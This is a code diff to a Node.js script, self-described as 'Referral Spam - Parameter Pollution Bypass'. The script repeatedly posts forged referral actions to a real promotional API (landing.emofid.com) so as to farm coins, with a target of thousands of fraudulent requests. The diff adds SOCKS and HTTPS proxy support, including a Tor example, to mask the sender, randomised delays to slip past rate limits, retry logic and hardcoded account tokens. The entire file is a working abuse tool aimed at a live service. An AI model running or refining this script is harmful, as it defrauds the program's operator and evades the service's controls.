@@ -1,14 +1,32 @@
 /**
  * Referral Spam - Parameter Pollution Bypass
  * Random 1-2 second delay between requests
+ *
+ * Usage: node referral-spam.js [token] [count] [proxyUrl]
+ * Example: node referral-spam.js "token" 100 "socks5://127.0.0.1:9050"
  */
 
+const fetch = require('node-fetch');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+
 const CONFIG = {
-  token: '545261|0M6zXDt5SaIiIh0HgBYXRojPcNi4RCU30c5gUnO3f69b3511',
-  count: 3257,      // Number of referrals to spam
-  delayMin: 5,     // Minimum delay in seconds
-  delayMax: 40,     // Maximum delay in seconds
+  token: process.argv[2] || '545029|7AaGWjjzE815naLIwKMazTIggTFTohUTr2KAIvWWc51ed48c',
+  count: parseInt(process.argv[3]) || 9257,
+  proxyUrl: process.argv[4] || null,
+  delayMin: 1,     // Minimum delay in seconds
+  delayMax: 20,    // Maximum delay in seconds
 };
+
+// Create proxy agent if proxy URL provided
+let agent = null;
+if (CONFIG.proxyUrl) {
+  if (CONFIG.proxyUrl.startsWith('socks')) {
+    agent = new SocksProxyAgent(CONFIG.proxyUrl);
+  } else {
+    agent = new HttpsProxyAgent(CONFIG.proxyUrl);
+  }
+}
 
 const BASE_URL = 'https://landing.emofid.com/api-service/anniversary40';
 
@@ -27,10 +45,20 @@ function randomDelay() {
   return Math.floor(Math.random() * range) + (CONFIG.delayMin * 1000);
 }
 
-async function getCoins() {
-  const res = await fetch(`${BASE_URL}/user/`, { headers: HEADERS });
-  const data = await res.json();
-  return parseFloat(data.data.scores[0].coins);
+async function getCoins(retries = 3) {
+  for (let attempt = 1; attempt <= retries; attempt++) {
+    try {
+      const res = await fetch(`${BASE_URL}/user/`, { headers: HEADERS, agent });
+      const data = await res.json();
+      return parseFloat(data.data.scores[0].coins);
+    } catch (err) {
+      if (attempt === retries) {
+        console.log(`   ⚠️  Failed to get coins: ${err.message}`);
+        return null;
+      }
+      await sleep(2000 * attempt);
+    }
+  }
 }
 
 function generateCode() {
@@ -43,25 +71,54 @@ function generateCode() {
   return code;
 }
 
-async function exploit() {
-  const response = await fetch(`${BASE_URL}/actions/`, {
-    method: 'POST',
-    headers: HEADERS,
-    body: JSON.stringify({
-      mission_name: ['referral', 'landing-login'],
-      referral_code: generateCode(),
-    }),
-  });
-  return await response.json();
+async function exploit(retries = 10) {
+  for (let attempt = 1; attempt <= retries; attempt++) {
+    try {
+      const response = await fetch(`${BASE_URL}/actions/`, {
+        method: 'POST',
+        headers: HEADERS,
+        body: JSON.stringify({
+          mission_name: ['referral', 'landing-login'],
+          referral_code: generateCode(),
+        }),
+        agent,
+      });
+      return await response.json();
+    } catch (err) {
+      if (attempt === retries) {
+        return { message: `Network error after ${retries} retries: ${err.message}`, error: true };
+      }
+      console.log(`   ⚠️  Network error, retrying (${attempt}/${retries})...`);
+      await sleep(2000 * attempt); // Exponential backoff
+    }
+  }
+}
+
+async function checkProxyIP() {
+  if (!agent) return 'No proxy';
+  try {
+    const res = await fetch('https://httpbin.org/ip', { agent, timeout: 10000 });
+    const data = await res.json();
+    return data.origin;
+  } catch (err) {
+    return 'Error: ' + err.message;
+  }
 }
 
 async function main() {
   console.log('='.repeat(45));
-  console.log('  Referral Spam (1-2s random delay)');
+  console.log('  Referral Spam (1-20s random delay)');
   console.log('='.repeat(45));
+  console.log(`Token: ${CONFIG.token.substring(0, 15)}...`);
+  console.log(`Count: ${CONFIG.count}`);
+  if (CONFIG.proxyUrl) {
+    console.log(`Proxy: ${CONFIG.proxyUrl}`);
+    const ip = await checkProxyIP();
+    console.log(`Proxy IP: ${ip}`);
+  }
 
   const initialCoins = await getCoins();
-  console.log(`\nStarting coins: ${initialCoins}`);
+  console.log(`\nStarting coins: ${initialCoins ?? 'unknown'}`);
   console.log(`Target: +${CONFIG.count * 10} coins\n`);
 
   let success = 0;
@@ -85,8 +142,12 @@ async function main() {
   const finalCoins = await getCoins();
 
   console.log('\n' + '='.repeat(45));
-  console.log(`Final coins: ${finalCoins}`);
-  console.log(`Gained: +${finalCoins - initialCoins}`);
+  console.log(`Final coins: ${finalCoins ?? 'unknown'}`);
+  if (finalCoins && initialCoins) {
+    console.log(`Gained: +${finalCoins - initialCoins}`);
+  } else {
+    console.log(`Successful requests: ${success} (+${success * 10} estimated)`);
+  }
   console.log('='.repeat(45));
 }
 
